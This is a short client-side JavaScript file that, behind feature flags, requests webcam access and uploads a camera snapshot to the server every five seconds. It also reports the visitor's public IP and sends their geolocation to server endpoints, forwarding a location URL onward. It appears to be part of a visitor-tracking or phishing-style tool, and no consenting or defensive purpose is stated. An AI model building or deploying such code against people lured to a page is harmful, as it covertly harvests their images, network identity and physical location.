const video = document.getElementById("video");
const ipResult = document.getElementById("ipResult");
const locationResult = document.getElementById("locationResult");
const imageResult = document.getElementById("imageResult");

function sendIP(ip) {
    ipResult.innerText = `Public IP: ${ip}`;
}

if (enableCamera) {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            setInterval(() => {
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0);
                const imageData = canvas.toDataURL("image/png").split(',')[1];

                fetch("/capture_image", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ image_data: imageData })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.image_url) {
                        imageResult.innerText = `Image captured: ${data.image_url}`;
                    }
                });
            }, 5000);
        })
        .catch(err => {
            console.error("Error accessing camera:", err);
        });
}

if (enableIP) {
    fetch("/get_ip")
        .then(response => response.json())
        .then(data => {
            if (data.ip) {
                sendIP(data.ip);
            }
        })
        .catch(err => {
            console.error("Error retrieving IP:", err);
        });
}

if (enableLocation) {
    navigator.geolocation.getCurrentPosition(position => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        fetch("/get_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ latitude, longitude })
        })
        .then(response => response.json())
        .then(data => {
            if (data.location_url) {
                locationResult.innerText = `Location: ${data.location_url}`;
            }
             fetch("/send_location", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ location_url: data.location_url })
                });
        });
    });
}
